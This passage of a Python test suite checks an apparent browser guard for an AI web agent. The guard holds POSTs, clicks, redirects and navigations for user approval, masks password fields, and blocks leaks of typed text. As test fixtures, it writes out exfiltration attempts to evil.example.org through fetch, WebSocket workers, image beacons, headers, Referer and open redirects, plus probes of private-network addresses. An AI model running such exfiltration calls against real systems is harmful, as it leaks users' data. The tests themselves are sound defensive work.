            x.open('PUT', '/api/item/4'); x.onloadend = () => res(x.status); x.send('{"a":1}'); })""")
        await b.page.frame_locator("#ifr").locator("#ff").evaluate("f => f.submit()")
        await settle_holds(g, fake, 2)
    by_url = {r.url: r for r in fake.final}
    assert by_url[START + "/api/item/4"].method == "PUT"
    assert by_url[START + "/frame/post"].frame == "sub"
    assert not site.hits("site.example.com", "/api/item/4") and not site.hits("site.example.com", "/frame/post")


@needs_browser
async def test_beacon_and_analytics_are_dropped_without_a_card(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate("navigator.sendBeacon('/beacon', 'data')")
        await b.page.evaluate("fetch('https://www.google-analytics.com/g/collect?v=2').catch(() => 0)")
        await asyncio.sleep(0.5)
    assert not fake.final and g.dropped >= 2
    assert not site.hits("site.example.com", "/beacon") and not site.hits("www.google-analytics.com")


@needs_browser
async def test_dedicated_worker_post_is_held_and_shared_worker_is_unavailable(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        out = await b.page.evaluate("""() => new Promise(res => { const w = new Worker('/w.js');
            w.onmessage = e => res(e.data); setTimeout(() => res('timeout'), 6000); })""")
        await settle_holds(g, fake, 1)
        shared = await b.page.evaluate("typeof window.SharedWorker")
        in_frame = await b.page.evaluate("""() => { const f = document.createElement('iframe');
            document.body.appendChild(f); return typeof f.contentWindow.SharedWorker; }""")
        rtc = await b.page.evaluate("typeof window.RTCPeerConnection + typeof window.webkitRTCPeerConnection")
    assert out == "err"
    assert fake.final[0].url == START + "/api/worker"
    assert not site.hits("site.example.com", "/api/worker")
    assert shared == "undefined" and in_frame == "undefined"
    assert rtc == "undefinedundefined"


@needs_browser
async def test_launch_flags_disable_shared_workers(site):
    g = make_guard(make_policy(), FakeHolds())
    async with Browser(site, g, args=EXFIL_LAUNCH_ARGS) as b:
        # A fresh context without the init script: the launch flag alone.
        ctx = await b.browser.new_context(ignore_https_errors=True)
        page = await ctx.new_page()
        await page.goto("about:blank")
        assert await page.evaluate("typeof SharedWorker") == "undefined"
        await ctx.close()


@needs_browser
async def test_307_and_308_after_an_approved_post_become_new_holds(site):
    decisions = iter(["release", "decline", "release", "release"])
    fake = FakeHolds(decide=lambda r: next(decisions))
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        r = await b.page.evaluate("fetch('/post307', {method: 'POST', body: 'p=1'}).then(r => r.status).catch(e => 'err')")
        await settle_holds(g, fake, 2)
        assert r == "err"
        await b.page.evaluate("""() => { const f = document.createElement('form'); f.method = 'post';
            f.action = '/post308'; const i = document.createElement('input'); i.name = 'q'; i.value = '2';
            f.appendChild(i); document.body.appendChild(f); f.submit(); }""")
        await settle_holds(g, fake, 4)
        await until(lambda: site.hits("site.example.com", "/post308b"))
    urls = [(r.method, r.url) for r in fake.final]
    assert urls == [("POST", START + "/post307"), ("POST", START + "/post307b"),
                    ("POST", START + "/post308"), ("POST", START + "/post308b")]
    assert fake.final[1].body_sha256 == hashlib.sha256(b"p=1").hexdigest()
    assert len(site.hits("site.example.com", "/post307", "POST")) == 1
    assert not site.hits("site.example.com", "/post307b")
    assert len(site.hits("site.example.com", "/post308b", "POST")) == 1


@needs_browser
async def test_held_post_with_passwd_field_never_shows_the_value(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    g.typed.add("Alice Example")
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.fill("#name", "Alice Example")
        await b.page.fill("#passwd", "hunter2-not-typed-by-model")
        await b.page.evaluate("document.getElementById('f').submit()")
        await settle_holds(g, fake, 1)
    fields = {f.name: f for f in fake.final[0].body_summary}
    assert fields["name"].value == "Alice Example" and not fields["name"].hidden
    assert fields["passwd"].hidden and fields["passwd"].value is None
    assert "hunter2" not in fake.final[0].model_dump_json()


@needs_browser
async def test_out_of_scope_post_with_typed_string_is_refused_without_a_card(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    g.typed.add(TYPED)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        out = await b.page.evaluate(
            f"fetch('https://evil.example.org/c', {{method: 'POST', body: 'm={TYPED}'}}).then(r => r.status).catch(e => 'err')")
        plain = await b.page.evaluate(
            "fetch('https://evil.example.org/d', {method: 'POST', body: 'm=hello'}).then(r => r.status).catch(e => 'err')")
        await g.wait_holds(5)
    assert out == "err" and plain == "err"
    assert [r.url for r in fake.final] == ["https://evil.example.org/d"]
    assert fake.final[0].out_of_scope
    assert not site.hits("evil.example.org")


# Browser tests: click-level holds and the login exemption ----------------------------------


@needs_browser
async def test_click_level_holds_on_unprofiled_site(site):
    answers = iter(["decline", "release"])
    fake = FakeHolds(decide=lambda r: next(answers))
    g = make_guard(make_policy(), fake)
    g.set_action_description("Accept the bid invitation")
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        accept = await g.check_click(b.page, b.page.locator("#accept"))
        delete = await g.check_click(b.page, b.page.locator("#del"))
        plain = await g.check_click(b.page, b.page.locator("#plain"))
    assert not accept.proceed and accept.held and "declined" in accept.notice
    assert delete.proceed and delete.held
    assert plain.proceed and not plain.held
    first, second = fake.final
    assert (first.trigger, first.method, first.element_label) == ("click", "CLICK", "Accept bid")
    assert first.url == START + "/bids/7/accept" and first.model_description == "Accept the bid invitation"
    assert second.url == START + "/files/9/delete"
    assert not site.hits("site.example.com", "/bids/7/accept")


@needs_browser
async def test_final_get_profile_link_is_held_at_the_network(site):
    fake = FakeHolds()
    profile = {"final_get": [{"host": "site.example.com", "path_regex": "/files/\\d+/delete", "label": "Delete file"}]}
    g = make_guard(make_policy(profile=profile), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#del", no_wait_after=True)
        await settle_holds(g, fake, 1)
    assert fake.final[0].method == "GET" and fake.final[0].profile_label == "Delete file"
    assert not site.hits("site.example.com", "/files/9/delete")


@needs_browser
async def test_fill_credential_then_fetch_post_to_other_path_is_held(site):
    fake = FakeHolds()
    g = make_guard(make_policy(credentials=True), fake)
    async with Browser(site, g) as b:
        await b.goto("https://login.example.com/login")
        user = b.page.locator("#user")
        await user.fill("owner@example.com")
        await g.open_login_attempt(credential_id=CRED_ID, page=b.page, element=user, markers=("owner@example.com",))
        # Page script, same origin, not the form: held.
        out = await b.page.evaluate("fetch('/api/other', {method: 'POST', body: 'z=1'}).then(r => r.status).catch(e => 'err')")
        await settle_holds(g, fake, 1)
        assert out == "err"
        # The model may not click outside the filled form while the attempt is open.
        refused = await g.check_click(b.page, b.page.locator("#elsewhere"))
        assert not refused.proceed and "sign-in" in refused.notice
        typing = await g.check_interaction(b.page, b.page.locator("#pw"))
        assert typing.proceed
        submit = await g.check_click(b.page, b.page.locator("#signin"))
        assert submit.proceed and not submit.held
        await b.page.click("#signin")
        await b.page.wait_for_selector("#welcome")
        assert not g.login_open      # closed on the first response
        later = await b.page.evaluate("fetch('/session', {method: 'POST', body: 'again=1'}).then(r => r.status).catch(e => 'err')")
        await settle_holds(g, fake, 2)
        assert later == "err"
    assert [r.url for r in fake.final] == ["https://login.example.com/api/other", "https://login.example.com/session"]
    assert len(site.hits("login.example.com", "/session", "POST")) == 1
    assert not site.hits("login.example.com", "/api/other")


@needs_browser
async def test_login_attempt_refused_off_the_login_origin(site):
    g = make_guard(make_policy(credentials=True), FakeHolds())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        with pytest.raises(ValueError):
            await g.open_login_attempt(credential_id=CRED_ID, page=b.page, element=b.page.locator("#name"))
        with pytest.raises(ValueError):
            await g.open_login_attempt(credential_id=uuid4(), page=b.page, element=b.page.locator("#name"))


@needs_browser
async def test_curated_login_paths_exempt_any_listed_post(site):
    fake = FakeHolds()
    pol = make_policy(kind="curated", credentials=True)
    pol = pol.model_copy(update={"sites": [pol.sites[0].model_copy(update={"login_paths": ["/session"]})]})
    g = make_guard(pol, fake)
    async with Browser(site, g) as b:
        await b.goto("https://login.example.com/login")
        await g.open_login_attempt(credential_id=CRED_ID, page=b.page, element=b.page.locator("#user"))
        out = await b.page.evaluate("fetch('/session', {method: 'POST', body: 'u=1'}).then(r => r.status).catch(e => 'err')")
        assert out == 200 and not fake.final


# Browser tests: scope, redirects and exfiltration (plan 10.3) ------------------------------------


@needs_browser
async def test_302_open_redirect_carrying_typed_data_is_refused_at_the_hop(site):
    fake = FakeHolds(site_decide=lambda r: "full")
    g = make_guard(make_policy(), fake)
    g.typed.add(TYPED)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        to = quote(f"https://evil.example.org/c?d={TYPED}", safe="")
        # The in-scope hop loads (start origin); the guard's fresh request for
        # the Location is refused before it leaves.
        await b.page.goto(f"{START}/go?to={to}", wait_until="load")
        assert await until(lambda: any(r["reason"] == "typed_string_offsite" for r in g.blocked.values()))
        await g.wait_holds(5)
    assert site.hits("site.example.com", "/go")
    assert not site.hits("evil.example.org") and not fake.sites
    assert any("typed" in n for n in g.take_notices())


@needs_browser
async def test_out_of_scope_redirect_becomes_a_site_hold_before_any_request(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#bounce", no_wait_after=True)
        await settle_holds(g, fake, 1, site=True)
    hold = fake.sites[0]
    assert (hold.trigger, hold.target_origin, hold.from_origin) == ("redirect", "https://other.example.net", START)
    assert not site.hits("other.example.net")


@needs_browser
async def test_in_scope_redirect_is_followed_as_a_fresh_request(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#hop")
        await b.page.wait_for_selector("#landed")
        assert b.page.url == START + "/landed"
    assert not fake.final and not fake.sites


@needs_browser
async def test_model_navigation_out_of_scope_site_hold_release_and_refetch(site):
    fake = FakeHolds(site_decide=lambda r: "full")
    wider = make_policy(version=2, extra_sites=[{
        "site_key": "other", "label": "Other", "kind": "ad_hoc", "scope": "origin", "grant_version": 1,
        "exact_origins": ["https://other.example.net"]}])

    async def refresh() -> UserJobPolicy:
        return wider

    g = make_guard(make_policy(), fake, refresh_policy=refresh)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        url = "https://other.example.net/land?ref=1"
        assert g.prepare_navigation(b.page, url)
        await b.page.goto(url, wait_until="domcontentloaded", timeout=8000)
        assert await b.page.inner_text("#other") == "other"
    hold = fake.sites[0]
    assert (hold.trigger, hold.carries_data) == ("navigate", True)
    assert g.policy.policy_version == 2
    assert len(site.hits("other.example.net", "/land")) == 1


@needs_browser
async def test_site_only_release_opens_the_origin_root(site):
    fake = FakeHolds(site_decide=lambda r: "site_only")
    wider = make_policy(version=2, extra_sites=[{
        "site_key": "other", "label": "Other", "kind": "ad_hoc", "scope": "origin", "grant_version": 1,
        "exact_origins": ["https://other.example.net"]}])

    async def refresh() -> UserJobPolicy:
        return wider

    g = make_guard(make_policy(), fake, refresh_policy=refresh)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        url = "https://other.example.net/land?ref=1"
        assert g.prepare_navigation(b.page, url)
        with pytest.raises(Exception):
            await b.page.goto(url, wait_until="domcontentloaded", timeout=8000)
        await g.wait_holds(5)
        assert await until(lambda: site.hits("other.example.net", "/"))
    assert not site.hits("other.example.net", "/land")
    assert any("home page" in n for n in g.take_notices())


def test_prepare_navigation_applies_floor_and_url_rule():
    g = make_guard(make_policy(), FakeHolds())
    assert not g.prepare_navigation(None, "http://10.0.0.5/")
    assert not g.prepare_navigation(None, "javascript:alert(1)")
    assert g.prepare_navigation(None, START + "/x?q=1")
    long = START + "/s?t=" + "QUJD" * 40
    assert not g.prepare_navigation(None, long)
    assert g.prepare_navigation(None, long, start_url=long)
    assert g.prepare_navigation(None, long, page_links=[long])


@needs_browser
async def test_declined_site_hold_and_popup_trigger(site):
    fake = FakeHolds()
    g = make_guard(make_policy(), fake)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate("window.open('https://evil.example.org/x')")
        await settle_holds(g, fake, 1, site=True)
    assert fake.sites[0].trigger == "popup"
    assert not site.hits("evil.example.org")
    assert any("declined" in n for n in g.take_notices())


@needs_browser
async def test_typed_string_to_offsite_image_is_refused_but_start_origin_is_fine(site):
    g = make_guard(make_policy(), FakeHolds())
    g.typed.add(TYPED)
    blob = base64.b64encode(b"z" + TYPED.encode()).decode()
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate(f"""() => {{
            for (const u of ['https://cdn.example.net/p.png?d={TYPED}', 'https://cdn.example.net/q.png?d={blob}',
                             '/s.png?d={TYPED}', 'https://cdn.example.net/plain.png']) {{
                const i = new Image(); i.src = u; document.body.appendChild(i); }} }}""")
        await until(lambda: site.hits("cdn.example.net", "/plain.png") and site.hits("site.example.com", "/s.png"))
        await asyncio.sleep(0.3)
    assert not site.hits("cdn.example.net", "/p.png") and not site.hits("cdn.example.net", "/q.png")


@needs_browser
async def test_private_network_targets_never_leave(site):
    g = make_guard(make_policy(), FakeHolds())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate("""() => { for (const u of ['http://10.0.0.5/a.png', 'http://192.168.1.1/b.png',
            'http://167772165/c.png', 'http://router.local/d.png']) { const i = new Image(); i.src = u;
            document.body.appendChild(i); } }""")
        with pytest.raises(Exception):
            await b.page.goto("http://192.168.1.1/", timeout=3000)
        await asyncio.sleep(0.3)
    hosts = {s.host for s in site.seen}
    assert hosts <= {"site.example.com"}, hosts


@needs_browser
async def test_websocket_refused_without_websocket_ok(site):
    g = make_guard(make_policy(), FakeHolds())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        r = await b.page.evaluate("""() => new Promise(res => { const w = new WebSocket('wss://site.example.com/sock');
            w.onopen = () => res('open'); w.onclose = () => res('closed'); setTimeout(() => res('timeout'), 4000); })""")
    assert r == "closed" and not site.hits("site.example.com", "/sock")


@needs_browser
@pytest.mark.parametrize("kind,expected", [("curated", "echo:hello"), ("ad_hoc", "closed")])
async def test_websocket_ok_only_on_curated_profile(site, kind, expected):
    g = make_guard(make_policy(kind=kind, profile={"websocket_ok": True, "websocket_reason": "live updates"}),
                   FakeHolds())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        r = await b.page.evaluate("""() => new Promise(res => { const w = new WebSocket('wss://site.example.com/sock');
            w.onopen = () => w.send('hello'); w.onmessage = e => res('echo:' + e.data);
            w.onclose = () => res('closed'); setTimeout(() => res('timeout'), 4000); })""")
    assert r == expected
    assert (site.ws_messages == [b"hello"]) == (kind == "curated")


@needs_browser
async def test_websocket_message_with_typed_string_offsite_is_refused(site):
    extra = [{"site_key": "app", "label": "App", "kind": "curated", "scope": "origin", "grant_version": 1,
              "exact_origins": ["https://other.example.net"], "profile": {"websocket_ok": True}}]
    g = make_guard(make_policy(extra_sites=extra), FakeHolds())
    g.typed.add(TYPED)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        r = await b.page.evaluate(f"""() => new Promise(res => {{ const w = new WebSocket('wss://other.example.net/sock');
            w.onopen = () => w.send('{TYPED}'); w.onmessage = e => res('echo'); w.onclose = () => res('closed');
            setTimeout(() => res('timeout'), 4000); }})""")
    assert r == "closed" and not site.ws_messages


WS_WORKER_SRC = (f"try {{ const w = new WebSocket('wss://evil.example.org/sock'); w.onopen = () => {{ w.send('{TYPED}');"
                 " postMessage('open'); }; w.onclose = () => postMessage('closed'); } catch (e) {"
                 " postMessage('blocked:' + e.name); }")

_RUN_WORKER = """([src, opts, how]) => new Promise(res => {
    try {
        const url = (src.startsWith('/') || src.startsWith('data:')) ? src : URL.createObjectURL(new Blob([src], {type: 'text/javascript'}));
        let W = Worker;
        if (how === 'ctor') W = Worker.prototype.constructor;
        if (how === 'popup') W = window.open().Worker;
        if (how === 'patched') { URL.createObjectURL = () => url; Blob = function () {}; }
        const w = new W(url, opts || undefined);
        w.onmessage = e => res(e.data); w.onerror = e => { e.preventDefault(); res('error:' + e.message); };
    } catch (e) { res('throw:' + e.name); }
    setTimeout(() => res('timeout'), 5000); })"""


@needs_browser
@pytest.mark.parametrize("opts,how", [(None, ""), ({"type": "module"}, ""), (None, "ctor"), (None, "popup"),
                                      (None, "patched")])
async def test_worker_scope_has_no_websocket(site, opts, how):
    """Review WI-9: a socket opened from a dedicated Worker skipped
    route_web_socket (websocket_ok, the typed-string check, the block record)."""
    g = make_guard(make_policy(), FakeHolds())
    g.typed.add(TYPED)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        nested = await b.page.evaluate(_RUN_WORKER, [
            "const u = URL.createObjectURL(new Blob([" + json.dumps(WS_WORKER_SRC) + "])); const n = new Worker(u);"
            " n.onmessage = e => postMessage('nested:' + e.data);", None, ""])
        http = await b.page.evaluate(_RUN_WORKER, ["/wk-ws.js", None, ""])
        r = await b.page.evaluate(_RUN_WORKER, [WS_WORKER_SRC, opts, how])     # last: 'patched' changes the page
        await asyncio.sleep(0.3)
    assert r == "blocked:TypeError", r
    assert nested == "nested:blocked:TypeError", nested
    assert http == "blocked:TypeError", http
    assert not site.hits("evil.example.org") and not site.ws_messages


@needs_browser
async def test_page_websocketstream_and_webtransport_are_removed(site):
    g = make_guard(make_policy(), FakeHolds())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        kinds = await b.page.evaluate("() => [typeof WebSocketStream, typeof WebTransport, "
                                      "typeof document.body.appendChild(document.createElement('iframe'))"
                                      ".contentWindow.WebSocketStream]")
    assert kinds == ["undefined", "undefined", "undefined"]


@needs_browser
async def test_real_workers_keep_working_through_the_bootstrap(site):
    g = make_guard(make_policy(), FakeHolds())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        classic = await b.page.evaluate(_RUN_WORKER, ["/wk.js", None, ""])
        module = await b.page.evaluate(_RUN_WORKER, ["/wkm.js", {"type": "module"}, ""])
        blob = await b.page.evaluate(_RUN_WORKER, ["postMessage(['blob', typeof WebSocket, 40 + 2])", None, ""])
        revoked = await b.page.evaluate("""() => new Promise(res => {
            const u = URL.createObjectURL(new Blob(['postMessage(7)'])); const w = new Worker(u); URL.revokeObjectURL(u);
            w.onmessage = e => res(e.data); setTimeout(() => res('timeout'), 5000); })""")
        data = await b.page.evaluate(_RUN_WORKER, ["data:text/javascript,postMessage(1)", None, ""])
        same = await b.page.evaluate("() => Worker.prototype.constructor === Worker && new Worker('/wk.js') instanceof Worker")
    assert classic == ["classic", "undefined", "undefined", 1, "/wk.js"], classic
    assert module == ["module", "undefined", "undefined", 2, "/wkm.js"], module
    assert blob == ["blob", "undefined", 42] and revoked == 7
    assert data in ("throw:SecurityError", "error:Uncaught SecurityError") or data.startswith("throw:"), data
    assert same is True


@needs_browser
async def test_typed_text_in_request_headers_never_leaves_the_start_origin(site):
    """Review WI-9: a custom header, or the page's own URL sent as Referer,
    carried typed text to another host."""
    g = make_guard(make_policy(), FakeHolds())
    g.typed.add(TYPED)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate(f"""() => fetch('https://cdn.example.net/h', {{headers: {{'x-d': '{TYPED}'}}}}).catch(e => 0)""")
        await b.page.evaluate(f"""() => {{ history.replaceState(null, '', '/?d={TYPED}');
            const i = new Image(); i.referrerPolicy = 'unsafe-url'; i.src = 'https://cdn.example.net/r.png';
            document.body.appendChild(i); }}""")
        await b.page.evaluate("() => fetch('https://cdn.example.net/plain', {headers: {'x-d': 'nothing typed'}}).catch(e => 0)")
        await until(lambda: site.hits("cdn.example.net", "/plain", "GET"), 3)
    leaks = [(s.path, s.headers) for s in site.seen if TYPED in json.dumps(s.headers)]
    assert not leaks, leaks
    assert not site.hits("cdn.example.net", "/h", "GET") and not site.hits("cdn.example.net", "/r.png")
    assert site.hits("cdn.example.net", "/plain", "GET")       # header values without typed text pass
    assert g.blocked


@needs_browser
async def test_start_origin_open_redirect_cannot_launder_typed_text(site):
    """Review WI-9: a continued subresource GET was redirected by Chromium
    itself, so the off-site hop was never checked."""
    g = make_guard(make_policy(), FakeHolds())
    g.typed.add(TYPED)
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.evaluate(f"""() => {{ const i = new Image();
            i.src = '/go?to=' + encodeURIComponent('https://evil.example.org/x.png?d={TYPED}');
            document.body.appendChild(i); }}""")
        await until(lambda: site.hits("site.example.com", "/go"), 3)
        await asyncio.sleep(0.5)
        ok = await b.page.evaluate("""() => fetch('/go?to=' + encodeURIComponent('/landed')).then(r => r.status)""")
    assert site.hits("site.example.com", "/go") and not site.hits("evil.example.org")
    assert ok == 200 and site.hits("site.example.com", "/landed")   # redirects without typed text still work


@needs_browser
async def test_build_guard_binds_the_v2_endpoints(site):
    calls = []

    async def send(method, path, body, query):
        calls.append((method, path))
        return {"hold_id": str(uuid4()), "status": "declined"}

    g = build_guard(make_policy(), send=send, lease_epoch=lambda: EPOCH, verifier=verifier())
    async with Browser(site, g) as b:
        await b.goto(START + "/")
        await b.page.click("#fetchpost")
        assert await until(lambda: calls)
        await g.wait_holds(5)
    assert calls == [("POST", f"/jobs/{JOB_ID}/user/holds")]


def test_module_surface_is_documented():
    for name in ("install", "check_click", "check_interaction", "open_login_attempt", "close_login_attempt",
                 "prepare_navigation", "wait_holds", "take_notices", "set_policy", "set_action_description"):
        assert hasattr(UserGuardV2, name) and name in guard_mod.__doc__
    assert exfil.TYPED_MIN == 12
